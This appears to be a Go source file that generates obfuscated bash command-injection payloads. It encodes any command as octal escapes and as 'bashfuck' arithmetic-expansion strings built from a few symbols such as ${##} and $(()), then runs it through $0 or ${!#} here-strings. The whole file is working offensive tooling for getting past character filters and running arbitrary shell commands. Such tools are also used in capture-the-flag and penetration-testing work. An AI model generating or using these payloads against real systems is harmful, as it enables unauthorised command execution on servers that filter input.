package main

import (
	"fmt"
	"strings"
)

func info(s string) string {
	total := 0
	usedChars := make(map[rune]bool)
	for _, c := range s {
		if c >= 32 && c <= 126 && !usedChars[c] {
			total++
			usedChars[c] = true
		}
	}
	return fmt.Sprintf("Charset: %s\nTotal Used: %d\nTotal length = %d\nPayload = %s\n---------------------------", sortedKeys(usedChars), total, len(s), s)
}

func sortedKeys(m map[rune]bool) string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, string(k))
	}
	return strings.Join(keys, " ")
}

func getOct(c rune) string {
	return fmt.Sprintf("%o", c)
}

func commonOTC(cmd string) string {
	var payload strings.Builder
	for _, c := range cmd {
		if c == ' ' {
			payload.WriteString("' $('")
		} else {
			payload.WriteString("\\" + getOct(c))
		}
	}
	payload.WriteString("'")
	return info(payload.String())
}

func bashfuckX(cmd string, form string) string {
	var bashStr strings.Builder
	for _, c := range cmd {
		bashStr.WriteString(fmt.Sprintf("\\\\$(($((1<<1))#%s))", strings.TrimPrefix(getOct(c), "0")))
	}

	payloadBit := bashStr.String()
	payloadZero := strings.ReplaceAll(payloadBit, "1", "${##}")
	payloadC := strings.ReplaceAll(strings.ReplaceAll(payloadBit, "1", "${##}"), "0", "${#}")

	if form == "bit" {
		payloadBit = "$0<<<$0\\<\\<\\<\\$'" + payloadBit + "'"
		return info(payloadBit)
	} else if form == "zero" {
		payloadZero = "$0<<<$0\\<\\<\\<\\$'" + payloadZero + "'"
		return info(payloadZero)
	} else if form == "c" {
		payloadC = "${!#}<<<${!#}\\<\\<\\<\\$'" + payloadC + "'"
		return info(payloadC)
	}

	return ""
}

func bashfuckY(cmd string) string {
	octList := []string{
		"$(())",                             // 0
		"$((~$(($((~$(())))$((~$(())))))))", // 1
		"$((~$(($((~$(())))$((~$(())))$((~$(())))))))",                                                        // 2
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",                                             // 3
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",                                  // 4
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",                       // 5
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",            // 6
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))", // 7
	}

	var bashFuck strings.Builder
	bashFuck.WriteString("__:=$(())")                    // set __ to 0
	bashFuck.WriteString("&&")                           // splicing
	bashFuck.WriteString("${!__}<<<${!__}\\<\\<\\<\\$'") // got 'sh'

	for _, c := range cmd {
		bashFuck.WriteString("\\\\")
		for _, i := range getOct(c) {
			index := int(i - '0')
			bashFuck.WriteString(octList[index])
		}
	}

	bashFuck.WriteString("'")

	return info(bashFuck.String())
}

func Generate(cmd string) {
	fmt.Println("Command: " + cmd)
	fmt.Println("Payload generated as follows:")
	fmt.Println(commonOTC(cmd))
	fmt.Println(bashfuckX(cmd, "bit"))
	fmt.Println(bashfuckX(cmd, "zero"))
}
